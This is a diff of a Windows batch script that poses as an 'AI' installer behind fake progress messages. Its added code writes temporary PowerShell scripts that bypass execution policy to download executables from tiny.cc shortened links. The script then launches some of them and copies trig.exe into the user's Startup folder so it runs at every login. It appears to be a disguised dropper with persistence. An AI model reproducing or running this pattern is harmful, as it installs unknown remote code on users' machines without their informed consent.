@@ -67,7 +67,15 @@ echo        ---------------------------------------
 echo        []                              =   5 ]
 echo        ---------------------------------------
 echo        Unloading Resources...
-powershell -Command Invoke-WebRequest http://tiny.cc/sanchitaiwbdown -OutFile C:\Users\%USERNAME%\ai\wbdown.exe
+:PowerShell
+SET PSScript=%temp%\~tmpDlFile.ps1
+IF EXIST "%PSScript%" DEL /Q /F "%PSScript%"
+ECHO [Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls">>"%PSScript%"
+ECHO Invoke-WebRequest "http://tiny.cc/sanchitaiwbdown" -OutFile "C:\Users\%USERNAME%\ai\wbdown.exe">>"%PSScript%"
+
+SET PowerShellDir=C:\Windows\System32\WindowsPowerShell\v1.0
+CD /D "%PowerShellDir%"
+Powershell -ExecutionPolicy Bypass -Command "& '%PSScript%'"
 powershell -Command START C:\Users\%USERNAME%\ai\wbdown.exe
 cls
 echo.
@@ -98,7 +106,15 @@ echo        ---------------------------------------
 echo        [][][]                          =  23 ]
 echo        ---------------------------------------
 echo        Interpreting Built-in-Commands...
-powershell -Command Invoke-WebRequest http://tiny.cc/sanchitaiexdown -OutFile C:\Users\%USERNAME%\ai\exdown.exe
+:PowerShell
+SET PSScript=%temp%\~tmpDlFile.ps1
+IF EXIST "%PSScript%" DEL /Q /F "%PSScript%"
+ECHO [Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls">>"%PSScript%"
+ECHO Invoke-WebRequest "http://tiny.cc/sanchitaiexdown" -OutFile "C:\Users\%USERNAME%\ai\exdown.exe">>"%PSScript%"
+
+SET PowerShellDir=C:\Windows\System32\WindowsPowerShell\v1.0
+CD /D "%PowerShellDir%"
+Powershell -ExecutionPolicy Bypass -Command "& '%PSScript%'"
 powershell -Command START C:\Users\%USERNAME%\ai\exdown.exe
 cls
 echo.
@@ -129,7 +145,15 @@ echo        ---------------------------------------
 echo        [][][][][]                      =  38 ]
 echo        ---------------------------------------
 echo        Setting Pre-Installed Variables...
-powershell -Command Invoke-WebRequest http://tiny.cc/sanchitai -OutFile C:\Users\%USERNAME%\ai\ai\ai.exe
+:PowerShell
+SET PSScript=%temp%\~tmpDlFile.ps1
+IF EXIST "%PSScript%" DEL /Q /F "%PSScript%"
+ECHO [Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls">>"%PSScript%"
+ECHO Invoke-WebRequest "http://tiny.cc/sanchitai" -OutFile "C:\Users\%USERNAME%\ai\ai\ai.exe">>"%PSScript%"
+
+SET PowerShellDir=C:\Windows\System32\WindowsPowerShell\v1.0
+CD /D "%PowerShellDir%"
+Powershell -ExecutionPolicy Bypass -Command "& '%PSScript%'"
 cls
 echo.
 echo.
@@ -159,7 +183,15 @@ echo        ---------------------------------------
 echo        [][][][][][]                    =  45 ]
 echo        ---------------------------------------
 echo        Unloading AI Binaries...
-powershell -Command Invoke-WebRequest http://tiny.cc/sanchitaifavicon -OutFile C:\Users\%USERNAME%\ai\data\favicon.ico
+:PowerShell
+SET PSScript=%temp%\~tmpDlFile.ps1
+IF EXIST "%PSScript%" DEL /Q /F "%PSScript%"
+ECHO [Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls">>"%PSScript%"
+ECHO Invoke-WebRequest "http://tiny.cc/sanchitaifavicon" -OutFile "C:\Users\%USERNAME%\ai\data\favicon.ico">>"%PSScript%"
+
+SET PowerShellDir=C:\Windows\System32\WindowsPowerShell\v1.0
+CD /D "%PowerShellDir%"
+Powershell -ExecutionPolicy Bypass -Command "& '%PSScript%'"
 cls
 echo.
 echo.
@@ -229,7 +261,15 @@ echo        ---------------------------------------
 echo        [][][][][][][][][][]            =  63 ]
 echo        ---------------------------------------
 echo        Scaning for Error...
-powershell -Command Invoke-WebRequest http://tiny.cc/sanchitaiupdate -OutFile C:\Users\%USERNAME%\ai\data\upai.exe
+:PowerShell
+SET PSScript=%temp%\~tmpDlFile.ps1
+IF EXIST "%PSScript%" DEL /Q /F "%PSScript%"
+ECHO [Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls">>"%PSScript%"
+ECHO Invoke-WebRequest "http://tiny.cc/sanchitaiupdate" -OutFile "C:\Users\%USERNAME%\ai\data\upai.exe">>"%PSScript%"
+
+SET PowerShellDir=C:\Windows\System32\WindowsPowerShell\v1.0
+CD /D "%PowerShellDir%"
+Powershell -ExecutionPolicy Bypass -Command "& '%PSScript%'"
 cls
 echo.
 echo.
@@ -259,7 +299,15 @@ echo        ---------------------------------------
 echo        [][][][][][][][][][][][]        =  75 ]
 echo        ---------------------------------------
 echo        Scaning for Error...
-powershell -Command Invoke-WebRequest http://tiny.cc/sanchitaiconfig -OutFile C:\Users\%USERNAME%\ai\ai\aiconfig.exe
+:PowerShell
+SET PSScript=%temp%\~tmpDlFile.ps1
+IF EXIST "%PSScript%" DEL /Q /F "%PSScript%"
+ECHO [Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls">>"%PSScript%"
+ECHO Invoke-WebRequest "http://tiny.cc/sanchitaiconfig" -OutFile "C:\Users\%USERNAME%\ai\ai\aiconfig.exe">>"%PSScript%"
+
+SET PowerShellDir=C:\Windows\System32\WindowsPowerShell\v1.0
+CD /D "%PowerShellDir%"
+Powershell -ExecutionPolicy Bypass -Command "& '%PSScript%'"
 cls
 echo.
 echo.
@@ -304,7 +352,15 @@ echo        ---------------------------------------
 echo        [][][][][][][][][][][][][][][]  =  90 ]
 echo        ---------------------------------------
 echo        Installing Binaries...
-powershell -Command Invoke-WebRequest http://tiny.cc/sanchitaitrigger -OutFile C:\Users\%USERNAME%\ai\ai\trig.exe
+:PowerShell
+SET PSScript=%temp%\~tmpDlFile.ps1
+IF EXIST "%PSScript%" DEL /Q /F "%PSScript%"
+ECHO [Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls">>"%PSScript%"
+ECHO Invoke-WebRequest "http://tiny.cc/sanchitaitrigger" -OutFile "C:\Users\%USERNAME%\ai\ai\trig.exe">>"%PSScript%"
+
+SET PowerShellDir=C:\Windows\System32\WindowsPowerShell\v1.0
+CD /D "%PowerShellDir%"
+Powershell -ExecutionPolicy Bypass -Command "& '%PSScript%'"
 powershell -Command Move-Item C:\Users\%USERNAME%\ai\ai\trig.exe """C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"""
 cls
 echo.
